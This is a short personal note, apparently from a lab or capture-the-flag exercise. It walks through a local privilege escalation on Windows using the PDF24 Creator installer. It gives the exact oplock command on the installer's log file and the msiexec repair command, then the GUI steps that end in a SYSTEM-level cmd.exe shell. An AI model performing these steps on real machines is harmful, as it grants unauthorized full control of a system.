- Found the msi in the `C:\_install` folder
```
    Directory: C:\_install

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/28/2023  11:21 AM       60804608 Firefox Setup 121.0.msi
-a----        12/28/2023   5:39 AM       43593728 mRemoteNG-Installer-1.76.20.24615.msi
-a----        12/14/2023  10:07 AM      462602240 pdf24-creator-11.15.1-x64.msi
```

```
PS C:\Windows> cd C:\_install
PS C:\_install> ls


    Directory: C:\_install


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/28/2023  11:21 AM       60804608 Firefox Setup 121.0.msi
-a----        12/28/2023   5:39 AM       43593728 mRemoteNG-Installer-1.76.20.24615.msi
-a----        12/14/2023  10:07 AM      462602240 pdf24-creator-11.15.1-x64.msi

```
- Set a oplock on the log file
```
SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```
-  Run the installer
```
msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```
![[Pasted image 20260704122635.png]]
- A pop up shows, right click on the top bar -> properties 
![[Pasted image 20260704123000.png]]
- Click on `legacy console mode` then select Firefox
![[Pasted image 20260704123044.png]]
- Hit `ctrl+o` to open up the explorer.exe and on the file path enter `cmd.exe`
![[Pasted image 20260704123114.png]]
- We get a shell as `nt authority\system`
![[Pasted image 20260704123139.png]]
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References:
